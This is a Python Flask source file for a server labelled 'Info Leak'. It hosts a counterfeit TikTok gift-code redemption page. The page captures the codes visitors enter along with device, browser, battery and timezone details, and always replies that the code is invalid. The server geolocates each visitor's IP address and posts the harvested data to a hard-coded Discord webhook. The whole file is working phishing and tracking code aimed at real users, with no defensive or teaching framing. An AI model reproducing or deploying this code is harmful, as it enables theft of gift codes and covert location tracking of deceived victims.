from flask import Flask, request, jsonify, send_file
import json
import datetime
import os
import requests

app = Flask(__name__)

# Your Discord webhook URL
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1559407288585031782/V-VTGPgCyHB5hA34mhE4RE2VeAPBJGr5GMp6Buw-tg6RzUpvBSdecdHy0oX4IXCtSKzO"


def _find_index():
    """Locate index.html no matter where the app is started from."""
    candidates = [
        os.path.join(app.static_folder, 'index.html'),          # ./static/index.html
        os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'static', 'index.html')),
        os.path.join(os.path.dirname(__file__), 'index.html'),  # ./index.html (root)
        os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'index.html')),
    ]
    for c in candidates:
        if c and os.path.isfile(c):
            return c
    return None


def serve_index(anything=None):
    path = _find_index()
    if path:
        return send_file(path)
    return (
        "<h1>Info Leak server running</h1>"
        "<p>No index.html was found next to /static. Place your page at <code>static/index.html</code>.</p>",
        200,
    )


# --- NEW: Fake TikTok Redeem Code Page ---
@app.route('/tiktokpage331', methods=['GET'])
def tiktok_fake_page():
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Redeem Code - TikTok</title>
        <style>
            body {
                background-color: #121212;
                color: #ffffff;
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
                margin: 0;
            }
            .container {
                background-color: #1e1e1e;
                padding: 40px;
                border-radius: 8px;
                text-align: center;
                width: 90%;
                max-width: 400px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.5);
            }
            .logo {
                font-size: 32px;
                font-weight: bold;
                margin-bottom: 20px;
            }
            .logo span:nth-child(1) { color: #00f2ea; text-shadow: 2px 2px #ff0050; }
            .logo span:nth-child(2) { color: #ffffff; }
            h2 { margin-bottom: 20px; font-size: 20px; }
            input {
                width: 100%;
                padding: 12px;
                margin-bottom: 20px;
                border: 1px solid #333;
                border-radius: 4px;
                background-color: #2f2f2f;
                color: #fff;
                font-size: 16px;
                box-sizing: border-box;
                text-align: center;
                letter-spacing: 2px;
            }
            input:focus { outline: none; border-color: #00f2ea; }
            button {
                width: 100%;
                padding: 12px;
                background-color: #ff0050;
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                transition: background-color 0.2s;
            }
            button:hover { background-color: #e60048; }
            .message {
                margin-top: 20px;
                font-size: 14px;
                color: #ff0050;
                display: none;
            }
            .spinner {
                display: none;
                margin: 20px auto;
                border: 4px solid #333;
                border-top: 4px solid #00f2ea;
                border-radius: 50%;
                width: 30px;
                height: 30px;
                animation: spin 1s linear infinite;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo"><span>Tik</span>tok</div>
            <h2>Redeem Gift Code</h2>
            <p style="color: #aaa; font-size: 14px; margin-bottom: 20px;">Enter your 16-digit code to add coins to your account.</p>
            <input type="text" id="codeInput" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19">
            <button id="redeemBtn" onclick="redeemCode()">Redeem</button>
            <div class="spinner" id="spinner"></div>
            <div class="message" id="message"></div>
        </div>

        <script>
            document.getElementById('codeInput').addEventListener('input', function (e) {
                let value = e.target.value.replace(/-/g, '').toUpperCase();
                let matches = value.match(/.{1,4}/g);
                let formattedValue = matches ? matches.join('-') : value;
                e.target.value = formattedValue;
            });

            function redeemCode() {
                const code = document.getElementById('codeInput').value;
                const btn = document.getElementById('redeemBtn');
                const spinner = document.getElementById('spinner');
                const msg = document.getElementById('message');

                if (code.replace(/-/g, '').length < 16) {
                    msg.textContent = "Please enter a valid 16-digit code.";
                    msg.style.display = "block";
                    return;
                }

                btn.style.display = "none";
                spinner.style.display = "block";
                msg.style.display = "none";

                const trackData = {
                    tiktokCode: code,
                    location: { error: "Not shared" },
                    screen: { width: screen.width, height: screen.height, pixelRatio: window.devicePixelRatio, colorDepth: screen.colorDepth },
                    battery: { level: "N/A", charging: "N/A" },
                    webRTCIPs: ["N/A"],
                    performance: { loadTime: "N/A" },
                    hardware: { hardwareConcurrency: navigator.hardwareConcurrency, deviceMemory: navigator.deviceMemory || "N/A", maxTouchPoints: navigator.maxTouchPoints },
                    fonts: [],
                    plugins: [],
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timezoneOffset: new Date().getTimezoneOffset(),
                    sessionId: Math.random().toString(36).substring(2, 15),
                    timestamp: new Date().toISOString(),
                    referrer: document.referrer || "Direct"
                };

                if (navigator.getBattery) {
                    navigator.getBattery().then(battery => {
                        trackData.battery = {
                            level: Math.round(battery.level * 100) + "%",
                            charging: battery.charging
                        };
                        sendTrack(trackData);
                    }).catch(() => { sendTrack(trackData); });
                } else {
                    sendTrack(trackData);
                }
            }

            function sendTrack(data) {
                fetch('/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).then(() => {
                    document.getElementById('spinner').style.display = "none";
                    const msg = document.getElementById('message');
                    msg.textContent = "Invalid code or already redeemed. Please check and try again.";
                    msg.style.color = "#ff0050";
                    msg.style.display = "block";
                    document.getElementById('redeemBtn').style.display = "block";
                    document.getElementById('redeemBtn').textContent = "Try Again";
                }).catch(err => {
                    document.getElementById('spinner').style.display = "none";
                    const msg = document.getElementById('message');
                    msg.textContent = "Network error. Please try again.";
                    msg.style.display = "block";
                    document.getElementById('redeemBtn').style.display = "block";
                });
            }
        </script>
    </body>
    </html>
    """
    return html_content


# --- THE FIX: catch ANY path / extension and still serve the page ---
app.add_url_rule('/<path:anything>', 'catch_all', view_func=serve_index, methods=['GET'])
app.add_url_rule('/', 'index', view_func=serve_index, methods=['GET'])


@app.route('/track', methods=['POST'])
def track_data():
    data = request.json
    print("Data received:", json.dumps(data, indent=2))

    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    ip_info = {}
    try:
        response = requests.get(f'http://ip-api.com/json/{client_ip}', timeout=5)
        if response.status_code == 200:
            ip_data = response.json()
            if ip_data.get('status') == 'success':
                ip_info = {
                    'ip': ip_data.get('query'),
                    'country': ip_data.get('country'),
                    'countryCode': ip_data.get('countryCode'),
                    'region': ip_data.get('regionName'),
                    'regionCode': ip_data.get('region'),
                    'city': ip_data.get('city'),
                    'district': ip_data.get('district'),
                    'zip': ip_data.get('zip'),
                    'lat': ip_data.get('lat'),
                    'lon': ip_data.get('lon'),
                    'isp': ip_data.get('isp'),
                    'org': ip_data.get('org'),
                    'as': ip_data.get('as'),
                    'reverse': ip_data.get('reverse'),
                    'mobile': ip_data.get('mobile', False),
                    'proxy': ip_data.get('proxy', False),
                    'hosting': ip_data.get('hosting', False),
                    'timezone': ip_data.get('timezone')
                }
    except Exception as e:
        print(f"IP lookup failed: {e}")

    data['ipInfo'] = ip_info
    data['clientIp'] = client_ip

    data['serverInfo'] = {
        'path': request.path,
        'userAgentHeader': request.headers.get('User-Agent', 'N/A'),
        'acceptLanguage': request.headers.get('Accept-Language', 'N/A'),
        'referer': request.headers.get('Referer', 'N/A'),
        'fullUrl': request.url,
    }

    send_to_discord(data)

    return jsonify({"status": "success", "discord_sent": True})


def send_to_discord(data):
    """Send boxed format to Discord"""

    location = data.get('location', {})
    ip_info = data.get('ipInfo', {})
    screen = data.get('screen', {})
    battery = data.get('battery', {})
    webrtc = data.get('webRTCIPs', [])
    perf = data.get('performance', {})
    hw = data.get('hardware', {})
    fonts = data.get('fonts', [])
    plugins = data.get('plugins', [])

    lines = []
    lines.append("```")
    lines.append("╔════════════════════════════════════════════════════════════╗")
    lines.append("║                    📡 INFO LEAK                           ║")
    lines.append("╠════════════════════════════════════════════════════════════╣")
    lines.append("")

    # TIKTOK CODE (if present)
    if data.get('tiktokCode'):
        lines.append("║ 🎫 TIKTOK REDEEM CODE")
        lines.append(f"║    Code: {data['tiktokCode']}")
        lines.append("║")

    # LOCATION
    if location and location.get('latitude'):
        lat = location.get('latitude')
        lng = location.get('longitude')
        acc = location.get('accuracy', 'N/A')
        lines.append("║ 📍 GPS LOCATION")
        lines.append(f"║    {lat}, {lng}")
        lines.append(f"║    Accuracy: ±{acc}m")
        lines.append(f"║    https://maps.google.com/?q={lat},{lng}")
    else:
        lines.append(f"║ 📍 LOCATION: ❌ {location.get('error', 'Not shared')}")
    lines.append("║")

    # IP INTELLIGENCE
    if ip_info:
        lines.append("║ 🌐 IP INTELLIGENCE")
        if ip_info.get('ip'): lines.append(f"║    IP: {ip_info['ip']}")
        place_parts = []
        if ip_info.get('city'): place_parts.append(ip_info['city'])
        state = ip_info.get('region') or ip_info.get('regionCode')
        if state: place_parts.append(state)
        country = ip_info.get('country')
        if country:
            cc = ip_info.get('countryCode')
            place_parts.append(f"{country} ({cc})" if cc else country)
        if place_parts:
            lines.append(f"║    Location: {', '.join(place_parts)}")
        if ip_info.get('district'): lines.append(f"║    District: {ip_info['district']}")
        if ip_info.get('zip'): lines.append(f"║    ZIP: {ip_info['zip']}")
        if ip_info.get('lat') and ip_info.get('lon'):
            lines.append(f"║    Coords: {ip_info['lat']}, {ip_info['lon']}")
            lines.append(f"║    https://maps.google.com/?q={ip_info['lat']},{ip_info['lon']}")
        if ip_info.get('isp'): lines.append(f"║    ISP: {ip_info['isp']}")
        if ip_info.get('org'): lines.append(f"║    Org: {ip_info['org']}")
        if ip_info.get('as'): lines.append(f"║    ASN: {ip_info['as']}")
        if ip_info.get('reverse'): lines.append(f"║    Hostname: {ip_info['reverse']}")
        if ip_info.get('timezone'): lines.append(f"║    TZ: {ip_info['timezone']}")
        flags = []
        if ip_info.get('proxy'): flags.append("🔴 PROXY/VPN")
        if ip_info.get('hosting'): flags.append("🟠 DATACENTER")
        if ip_info.get('mobile'): flags.append("🟢 MOBILE NETWORK")
        if flags:
            lines.append(f"║    Flags: {' | '.join(flags)}")
    lines.append("║")

    # DEVICE & BROWSER
    lines.append("║ 🖥️ DEVICE & BROWSER")
    lines.append(f"║    OS: {data.get('platform', 'N/A')}")
    lines.append(f"║    Browser: {data.get('userAgent', 'N/A')[:60]}...")
    lines.append(f"║    Language: {data.get('language', 'N/A')}")
    if hw.get('hardwareConcurrency'):
        lines.append(f"║    CPU: {hw['hardwareConcurrency']} cores")
    if hw.get('deviceMemory'):
        lines.append(f"║    RAM: {hw['deviceMemory']}GB")
    if hw.get('maxTouchPoints'):
        lines.append(f"║    Touch Points: {hw['maxTouchPoints']}")
    lines.append("║")

    # SCREEN
    lines.append("║ 📺 SCREEN")
    lines.append(f"║    Resolution: {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}")
    lines.append(f"║    Pixel Ratio: {screen.get('pixelRatio', 'N/A')}x")
    lines.append(f"║    Color Depth: {screen.get('colorDepth', 'N/A')}bit")
    lines.append("║")

    # WEBRTC LEAK
    if webrtc and webrtc[0] not in ['No local IPs found', 'WebRTC not supported']:
        lines.append("║ 🔓 WEBRTC LEAK")
        for ip in webrtc:
            lines.append(f"║    {ip}")
    lines.append("║")

    # FINGERPRINTS
    lines.append("║ 🆔 FINGERPRINTS")
    canvas = data.get('canvasFingerprint', 'N/A')
    audio = data.get('audioFingerprint', 'N/A')
    lines.append(f"║    Canvas: {canvas[:12] if isinstance(canvas, str) else 'N/A'}")
    lines.append(f"║    Audio: {audio[:12] if isinstance(audio, str) else 'N/A'}")
    lines.append("║")

    # BATTERY
    if battery:
        lines.append("║ 🔋 BATTERY")
        if battery.get('level'): lines.append(f"║    Level: {battery['level']}")
        if battery.get('charging') is not None:
            status = "Charging" if battery['charging'] else "Discharging"
            lines.append(f"║    Status: {status}")
    lines.append("║")

    # PERFORMANCE
    if perf and perf.get('loadTime') and perf['loadTime'] != 'N/A':
        lines.append("║ ⚡ PERFORMANCE")
        if perf.get('loadTime'): lines.append(f"║    Load Time: {perf['loadTime']}ms")
        if perf.get('dns'): lines.append(f"║    DNS: {perf['dns']}ms")
        if perf.get('ttfb'): lines.append(f"║    TTFB: {perf['ttfb']}ms")
        if perf.get('tcp'): lines.append(f"║    TCP: {perf['tcp']}ms")
    lines.append("║")

    # TIMEZONE
    lines.append("║ 🕐 TIMEZONE")
    lines.append(f"║    {data.get('timezone', 'N/A')}")
    if data.get('timezoneOffset') is not None:
        offset = data['timezoneOffset']
        hours = abs(offset) // 60
        mins = abs(offset) % 60
        sign = '-' if offset > 0 else '+'
        lines.append(f"║    UTC{sign}{hours:02d}:{mins:02d}")
    lines.append("║")

    # FONTS
    if fonts:
        font_list = ', '.join(fonts[:8])
        if len(fonts) > 8:
            font_list += f" +{len(fonts)-8} more"
        lines.append("║ 📝 FONTS")
        lines.append(f"║    {font_list}")
    lines.append("║")

    # PLUGINS
    if plugins:
        plugin_list = ', '.join(plugins[:5])
        if len(plugins) > 5:
            plugin_list += f" +{len(plugins)-5} more"
        lines.append("║ 🧩 PLUGINS")
        lines.append(f"║    {plugin_list}")
    lines.append("║")

    # SESSION
    lines.append("║ 🆔 SESSION")
    lines.append(f"║    ID: {data.get('sessionId', 'N/A')}")
    if data.get('timestamp'):
        ts = data['timestamp'][:19].replace('T', ' ')
        lines.append(f"║    Time: {ts}")
    srv = data.get('serverInfo', {})
    if srv.get('path') and srv['path'] != '/':
        lines.append(f"║    Visited: {srv['path']}")
    if srv.get('acceptLanguage') and srv['acceptLanguage'] != 'N/A':
        lines.append(f"║    Accept-Lang: {srv['acceptLanguage'][:50]}")
    if data.get('referrer') and data['referrer'] != 'Direct':
        lines.append(f"║    Referrer: {data['referrer'][:50]}...")
    elif srv.get('referer') and srv['referer'] != 'N/A':
        lines.append(f"║    Referrer: {srv['referer'][:50]}...")
    lines.append("║")

    # BOTTOM BORDER
    lines.append("╚════════════════════════════════════════════════════════════╝")
    lines.append("```")

    payload = {
        "content": "\n".join(lines),
        "username": "Info Leak"
    }

    try:
        response = requests.post(DISCORD_WEBHOOK, json=payload, timeout=10)
        print(f"Discord status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == '__main__':
    app.run(debug=True)
